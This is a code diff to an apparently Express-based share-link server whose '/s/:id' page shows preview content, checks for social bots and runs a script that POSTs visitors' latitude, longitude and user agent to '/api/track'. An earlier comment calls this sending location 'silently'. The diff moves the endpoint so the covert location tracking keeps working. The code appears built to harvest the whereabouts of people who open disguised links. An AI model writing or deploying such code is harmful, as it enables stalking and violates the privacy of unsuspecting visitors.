@@ -149,7 +149,6 @@ app.get('/s/:id', async (req, res) => {
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     const { title, description, image, destinationUrl, buttonText } = await fetchLinkData(req.params.id, host, protocol);
     const fullUrl = `${protocol}://${host}/s/${req.params.id}`;
-    const trackUrl = `/track/${req.params.id}`;
     const isBot = isSocialBot(req.headers['user-agent'] || '');
     const safeTitle = escapeHtml(title);
     const safeDescription = escapeHtml(description);
@@ -277,15 +276,14 @@ app.get('/s/:id', async (req, res) => {
         const linkId = '${req.params.id}';
         const storageKey = 'ubicar_subscribed_' + linkId;
         const destUrl = '${destinationUrl}';
-        const trackUrl = '${trackUrl}';
         const alreadySubscribed = localStorage.getItem(storageKey);
 
-        // Helper: send location silently to server
+        // Helper: send location to server via /api/track (works on Vercel)
         function sendLocation(lat, lng) {
-            fetch(trackUrl, {
+            fetch('/api/track', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ lat, lng, userAgent: navigator.userAgent })
+                body: JSON.stringify({ linkId: linkId, lat: lat, lng: lng, userAgent: navigator.userAgent })
             }).catch(function(){});
         }
 
